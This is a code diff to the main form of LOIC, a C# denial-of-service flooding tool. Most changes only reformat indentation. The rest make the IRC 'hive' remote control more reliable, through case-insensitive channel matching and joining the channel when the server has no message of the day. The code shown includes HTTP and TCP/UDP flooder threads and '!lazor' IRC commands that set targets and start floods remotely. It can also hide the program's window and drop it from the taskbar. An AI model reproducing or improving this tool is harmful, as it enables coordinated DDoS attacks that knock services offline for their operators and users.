@@ -16,41 +16,41 @@ using Meebey.SmartIrc4net;
 
 namespace LOIC
 {
-	public partial class frmMain : Form
-	{
-		private static XXPFlooder[] xxp;
-		private static HTTPFlooder[] http;
+    public partial class frmMain : Form
+    {
+        private static XXPFlooder[] xxp;
+        private static HTTPFlooder[] http;
         private static List<cHLDos> lLoic = new List<cHLDos>();
         private StringCollection aUpOLSites = new StringCollection();
         private StringCollection aDownOLSites = new StringCollection();
         private bool bIsHidden = false;
-		private static string sIP, sMethod, sData, sSubsite, sTargetDNS = "", sTargetIP = "";
-		private static int iPort, iThreads, iProtocol, iDelay, iTimeout, iSockspThread;
-		private static bool bResp, intShowStats;
-		private IrcClient irc;
-		private Thread irclisten;
-		private string channel;
-		private static bool ircenabled = false;
-		private Dictionary<string, string> OpList;
-		private delegate void CheckParamsDelegate(List<string> pars);
-		public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel)
-		{
-			InitializeComponent();
-			/* IRC */
-			if (ircserver != "") {txtIRCserver.Text = ircserver;}
-			if (ircport != "") {txtIRCport.Text = ircport;}
-			if (ircchannel != "") {txtIRCchannel.Text = ircchannel;}
-			/* Lets try this! */
+        private static string sIP, sMethod, sData, sSubsite, sTargetDNS = "", sTargetIP = "";
+        private static int iPort, iThreads, iProtocol, iDelay, iTimeout, iSockspThread;
+        private static bool bResp, intShowStats;
+        private IrcClient irc;
+        private Thread irclisten;
+        private string channel;
+        private static bool ircenabled = false;
+        private Dictionary<string, string> OpList;
+        private delegate void CheckParamsDelegate(List<string> pars);
+        public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel)
+        {
+            InitializeComponent();
+            /* IRC */
+            if (ircserver != "") {txtIRCserver.Text = ircserver;}
+            if (ircport != "") {txtIRCport.Text = ircport;}
+            if (ircchannel != "") {txtIRCchannel.Text = ircchannel;}
+            /* Lets try this! */
             bIsHidden = hide;
-			if ( hide )
-			{
-			    this.WindowState = FormWindowState.Minimized;
-			    this.ShowInTaskbar = false;
-			}
-			this.FormClosing += frmMain_Closing;
-			if (hive) enableHive.Checked = true;
-			if (!hive) disableHive.Checked = true;
-		}
+            if ( hide )
+            {
+                this.WindowState = FormWindowState.Minimized;
+                this.ShowInTaskbar = false;
+            }
+            this.FormClosing += frmMain_Closing;
+            if (hive) enableHive.Checked = true;
+            if (!hive) disableHive.Checked = true;
+        }
         private void Attack(bool toggle, bool on, bool silent)
         {
             if ((cmdAttack.Text == "IMMA CHARGIN MAH LAZER" && toggle == true) || (toggle == false && on == true))
@@ -289,7 +289,7 @@ namespace LOIC
                         int port;
                         if (!int.TryParse(txtIRCport.Text, out port)) port = 6667;
                         irc.Connect(txtIRCserver.Text, port);
-                        channel = txtIRCchannel.Text;
+                        channel = txtIRCchannel.Text.ToLower();
                         // irc.WriteLine(Rfc2812.Nick("loicbot"),Priority.Critical);
                         // irc.WriteLine(Rfc2812.User("loic", 0, "ACSLaw"),Priority.Critical);
                         irc.Login("LOIC_" + new Functions().RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
@@ -398,7 +398,7 @@ namespace LOIC
         }
         void OnTopic(object sender, TopicEventArgs e)
         {
-            if (e.Channel == channel && e.Topic.StartsWith("!lazor"))
+            if (e.Channel.ToLower() == channel && e.Topic.StartsWith("!lazor"))
             {
                 List<string> pars = new List<string>(e.Topic.Split(' '));
                 SetStatus("Controlled by topic");
@@ -412,7 +412,7 @@ namespace LOIC
         }
         void OnTopicChange(object sender, TopicChangeEventArgs e)
         {
-            if (e.Channel == channel && e.NewTopic.StartsWith("!lazor"))
+            if (e.Channel.ToLower() == channel && e.NewTopic.StartsWith("!lazor"))
             {
                 List<string> pars = new List<string>(e.NewTopic.Split(' '));
                 SetStatus("Controlled by topic");
@@ -457,7 +457,7 @@ namespace LOIC
         }
         void OnMessage(object sender, IrcEventArgs e)
         {
-            if (e.Data.Channel == channel)
+            if (e.Data.Channel.ToLower() == channel)
             {
                 if (e.Data.Message.StartsWith("!lazor "))
                 {
@@ -544,13 +544,13 @@ namespace LOIC
                         case "random":
                             if (value.ToLower() == "true")
                             {
-								chkRandom.Checked = true; //HTTP
-								chkMsgRandom.Checked = true; //TCP_UDP
+                                chkRandom.Checked = true; //HTTP
+                                chkMsgRandom.Checked = true; //TCP_UDP
                             }
                             else if (value.ToLower() == "false")
                             {
-								chkRandom.Checked = false; //HTTP
-								chkMsgRandom.Checked = false; //TCP_UDP
+                                chkRandom.Checked = false; //HTTP
+                                chkMsgRandom.Checked = false; //TCP_UDP
                             }
                             break;
                         case "speed":
@@ -622,21 +622,21 @@ namespace LOIC
         void OnReadLine(object sender, ReadLineEventArgs e)
         {
             string command = e.Line.Split(' ')[1];
-            if (command == "PING")
+            if( command.Equals("PING") )
             {
                 string server = e.Line.Split(' ')[2];
                 irc.WriteLine("PONG " + server, Priority.Critical);
             }
-            else if (command == "376") // end of motd
+            else if( command.Equals("422") || command.Equals("376") ) // 422: motd missing // 376: end of motd
             {
                 if (OpList != null) OpList.Clear();
                 irc.RfcJoin(channel);
             }
         }
-		private void frmMain_Load(object sender, EventArgs e)
-		{
-			this.Text = String.Format("{0} | U dun goofed | v. {1}", Application.ProductName, Application.ProductVersion);
-		}
+        private void frmMain_Load(object sender, EventArgs e)
+        {
+            this.Text = String.Format("{0} | U dun goofed | v. {1}", Application.ProductName, Application.ProductVersion);
+        }
         private void frmMain_Closing(object sender, FormClosingEventArgs e)
         {
             try
@@ -652,43 +652,43 @@ namespace LOIC
                 Environment.Exit(0);
             }
         }
-		private void cmdTargetURL_Click(object sender, EventArgs e)
-		{
+        private void cmdTargetURL_Click(object sender, EventArgs e)
+        {
             LockOnURL(false);
-		}
-		private void cmdTargetIP_Click(object sender, EventArgs e)
-		{
+        }
+        private void cmdTargetIP_Click(object sender, EventArgs e)
+        {
             LockOnIP(false);
-		}
-		private void txtTarget_Enter(object sender, EventArgs e)
-		{
-			cmdAttack.Focus();
-		}
-		private void cmdAttack_Click(object sender, EventArgs e)
-		{
+        }
+        private void txtTarget_Enter(object sender, EventArgs e)
+        {
+            cmdAttack.Focus();
+        }
+        private void cmdAttack_Click(object sender, EventArgs e)
+        {
             Attack(true, false, false);
-		}
-		private void tShowStats_Tick(object sender, EventArgs e)
-		{
-			if (intShowStats) return; intShowStats = true;
+        }
+        private void tShowStats_Tick(object sender, EventArgs e)
+        {
+            if (intShowStats) return; intShowStats = true;
 
-			bool isFlooding = false;
+            bool isFlooding = false;
             if (cmdAttack.Text == "Stop flooding") 
                 isFlooding = true;
-			if (iProtocol == 1 || iProtocol == 2)
-			{
-				int iFloodCount = 0;
+            if (iProtocol == 1 || iProtocol == 2)
+            {
+                int iFloodCount = 0;
                 int iFailed = 0;
-				for (int a = 0; a < xxp.Length; a++)
-				{
-					iFloodCount += xxp[a].FloodCount;
+                for (int a = 0; a < xxp.Length; a++)
+                {
+                    iFloodCount += xxp[a].FloodCount;
                     iFailed += xxp[a].Failed;
                     if (isFlooding && !xxp[a].IsFlooding)
                     {
                         xxp[a].Start();
                     }
-				}
-				lbRequested.Text = iFloodCount.ToString();
+                }
+                lbRequested.Text = iFloodCount.ToString();
                 lbFailed.Text = iFailed.ToString();
                 if (!bIsHidden && TrayIcon.Visible)
                 {
@@ -713,15 +713,15 @@ namespace LOIC
                     }
                 }
             }
-			if (iProtocol >= 3)
-			{
-				int iIdle = 0;
-				int iConnecting = 0;
-				int iRequesting = 0;
-				int iDownloading = 0;
-				int iDownloaded = 0;
-				int iRequested = 0;
-				int iFailed = 0;
+            if (iProtocol >= 3)
+            {
+                int iIdle = 0;
+                int iConnecting = 0;
+                int iRequesting = 0;
+                int iDownloading = 0;
+                int iDownloaded = 0;
+                int iRequested = 0;
+                int iFailed = 0;
 
                 if (iProtocol == 3)
                 {
@@ -813,13 +813,13 @@ namespace LOIC
                         }
                     }
                 }
-				lbFailed.Text = iFailed.ToString();
-				lbRequested.Text = iRequested.ToString();
-				lbDownloaded.Text = iDownloaded.ToString();
-				lbDownloading.Text = iDownloading.ToString();
-				lbRequesting.Text = iRequesting.ToString();
-				lbConnecting.Text = iConnecting.ToString();
-				lbIdle.Text = iIdle.ToString();
+                lbFailed.Text = iFailed.ToString();
+                lbRequested.Text = iRequested.ToString();
+                lbDownloaded.Text = iDownloaded.ToString();
+                lbDownloading.Text = iDownloading.ToString();
+                lbRequesting.Text = iRequesting.ToString();
+                lbConnecting.Text = iConnecting.ToString();
+                lbIdle.Text = iIdle.ToString();
                 if (!bIsHidden && TrayIcon.Visible)
                 {
                     if (isFlooding)
@@ -847,27 +847,27 @@ namespace LOIC
                         TrayIcon.BalloonTipTitle = "";
                     }
                 }
-			}
+            }
 
-			intShowStats = false;
-		}
-		private void tbSpeed_ValueChanged(object sender, EventArgs e)
-		{
-			iDelay = tbSpeed.Value;
-			if (http != null)
-			{
-				for (int a = 0; a < http.Length; a++)
-				{
-					if (http[a] != null) http[a].Delay = iDelay;
-				}
-			}
-			if (xxp != null)
-			{
-				for (int a = 0; a < xxp.Length; a++)
-				{
-					if (xxp[a] != null) xxp[a].Delay = iDelay;
-				}
-			}
+            intShowStats = false;
+        }
+        private void tbSpeed_ValueChanged(object sender, EventArgs e)
+        {
+            iDelay = tbSpeed.Value;
+            if (http != null)
+            {
+                for (int a = 0; a < http.Length; a++)
+                {
+                    if (http[a] != null) http[a].Delay = iDelay;
+                }
+            }
+            if (xxp != null)
+            {
+                for (int a = 0; a < xxp.Length; a++)
+                {
+                    if (xxp[a] != null) xxp[a].Delay = iDelay;
+                }
+            }
             if (lLoic.Count > 0)
             {
                 for (int a = (lLoic.Count - 1); a >= 0; a--)
@@ -875,7 +875,7 @@ namespace LOIC
                     lLoic[a].Delay = iDelay;
                 }
             }
-		}
+        }
         private void enableHive_CheckedChanged(object sender, EventArgs e)
         {
             if (enableHive.Checked)
@@ -1453,5 +1453,5 @@ namespace LOIC
             if((TrayIcon.BalloonTipText != "") && (TrayIcon.BalloonTipTitle != ""))
                 TrayIcon.ShowBalloonTip(1);
         }
-	}
+    }
 }
